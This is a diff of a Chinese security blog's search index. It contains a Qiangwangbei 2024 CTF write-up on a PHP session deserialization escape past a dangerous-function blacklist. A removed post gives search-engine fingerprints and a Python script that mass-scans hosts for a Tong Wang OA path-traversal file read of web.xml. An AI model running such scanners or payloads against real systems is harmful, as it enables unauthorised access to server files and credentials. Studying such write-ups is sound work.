+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;sensitiveFunctions <span class="keyword">as</span> <span class="variable">$function</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$sessionData</span>, <span class="variable">$function</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$sessionData</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$function</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$sessionData</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>与sensitiveFunctions作比较，跟进查看：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="variable">$sensitiveFunctions</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;proc_open&#x27;</span>];</span><br></pre></td></tr></table></figure></div>
+<p>危险函数黑名单，有时候想不明白从哪打漏洞点就可以从黑名单处逆推。上面的代码可以看出来校验的是sessionData，这玩意又明文传输，往这里打没跑了，更别提最上面还有个带eval的类：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>因为filterSensitiveFunctions()中进行了置空，所以直接从session里打反序列化逃逸触发notouchitsclass类再双写绕过即可</p>
+]]></content>
+      <tags>
+        <tag>竞赛复盘</tag>
       </tags>
   </entry>
   <entry>
@@ -406,51 +655,6 @@ alt="image.png"
       </tags>
   </entry>
   <entry>
-    <title>Tong Wang OA tooneAssistantAttachement File read</title>
-    <url>/2024/11/12/Tong%20Wang%20OA%20tooneAssistantAttachement%20File%20read/</url>
-    <content><![CDATA[<p>同望OA，即同望科技打造的智企云协同管理系统，是一款高效的企业协同移动办公系统。秉承“互联网++企业管理”理念，定位于以移动互联办公为基础的企业协同管理软件平台。它旨在通过内置常用标准模块与专项管理模块应用，安全快速地打通管理与业务通道，实现管理柔性和刚性的完美结合，助力企业实现协同价值最大化。</p>
-<p>​
-同望OA存在<strong>任意文件读取漏洞</strong>，攻击者可以通过漏洞读取服务器上的敏感文件，包括配置文件、保存的账号密码等敏感信息从而导致进一步攻击。</p>
-<ul>
-<li>Fofa：</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li>Hunter：</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
-<ul>
-<li>Quake：</li>
-</ul>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">body=&quot;loginAction.struts?actionType=blockLogin&quot;</span><br></pre></td></tr></table></figure></div>
-<h4 id="利用脚本">利用脚本</h4>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取文件并指定编码为 utf-8</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;src2.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file, <span class="built_in">open</span>(<span class="string">&#x27;url-vul.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        <span class="comment"># 去掉换行符并分割第一列和第二列</span></span><br><span class="line">        parts = line.strip().split()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span>  <span class="comment"># 忽略不完整的数据行</span></span><br><span class="line"></span><br><span class="line">        ip, port = parts[<span class="number">0</span>], parts[<span class="number">1</span>]</span><br><span class="line">        <span class="comment"># 拼接URL</span></span><br><span class="line">        url = <span class="string">f&quot;http://<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送请求</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问成功: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">                output_file.write(url + <span class="string">&#x27;\n&#x27;</span>)  <span class="comment"># 将成功的URL写入文件</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;访问失败，状态码: <span class="subst">&#123;response.status_code&#125;</span>，URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;请求错误: <span class="subst">&#123;e&#125;</span>,URL: <span class="subst">&#123;url&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/67332b1ed29ded1a8c70f335.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/67332b93d29ded1a8c713ff2.jpg"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-]]></content>
-      <tags>
-        <tag>day</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>红队信息搜集思路</title>
     <url>/2024/11/12/red%20team%20information%20search/</url>
     <content><![CDATA[<h3 id="方针">方针</h3>
@@ -537,37 +741,6 @@ alt="img"
 ]]></content>
       <tags>
         <tag>RT</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>强网杯2024-platform</title>
-    <url>/2024/11/08/qiangwangbei2024platform/</url>
-    <content><![CDATA[<p>扫描网站主页，获得www.zip源码，开始审计</p>
-<p>查看login.php，跟踪到index.php：</p>
-<figure>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://pic.imgdb.cn/item/672e18f0d29ded1a8c6cbe11.png"
-                     
-alt="image.png" 
-                >
-<figcaption aria-hidden="true">image.png</figcaption>
-</figure>
-<p>发现该系统将咱传入的username和password的明文放到session中(难评，跟进filterSensitiveFunctions()函数：</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterSensitiveFunctions</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$sessionFile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getSessionFilePath</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$sessionFile</span>)) &#123;</span><br><span class="line">        <span class="variable">$sessionData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$sessionFile</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;sensitiveFunctions <span class="keyword">as</span> <span class="variable">$function</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$sessionData</span>, <span class="variable">$function</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="variable">$sessionData</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$function</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$sessionData</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$sessionFile</span>, <span class="variable">$sessionData</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Sensitive functions have been filtered from the session file.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Session file not found.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>发现调用getSessionFilePath()，跟进：</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getSessionFilePath</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;sessionPath . <span class="string">&quot;/sess_&quot;</span> . <span class="variable language_">$this</span>-&gt;sessionId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>看不懂，反正是返回了一个路径，回到filterSensitiveFunctions()函数中</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;sensitiveFunctions <span class="keyword">as</span> <span class="variable">$function</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$sessionData</span>, <span class="variable">$function</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$sessionData</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$function</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$sessionData</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>与sensitiveFunctions作比较，跟进查看：</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="variable">$sensitiveFunctions</span> = [<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;passthru&#x27;</span>, <span class="string">&#x27;shell_exec&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;proc_open&#x27;</span>];</span><br></pre></td></tr></table></figure></div>
-<p>危险函数黑名单，有时候想不明白从哪打漏洞点就可以从黑名单处逆推。上面的代码可以看出来校验的是sessionData，这玩意又明文传输，往这里打没跑了，更别提最上面还有个带eval的类：</p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">notouchitsclass</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-<p>因为filterSensitiveFunctions()中进行了置空，所以直接从session里打反序列化逃逸触发notouchitsclass类再双写绕过即可</p>
-]]></content>
-      <tags>
-        <tag>竞赛复盘</tag>
       </tags>
   </entry>
   <entry>
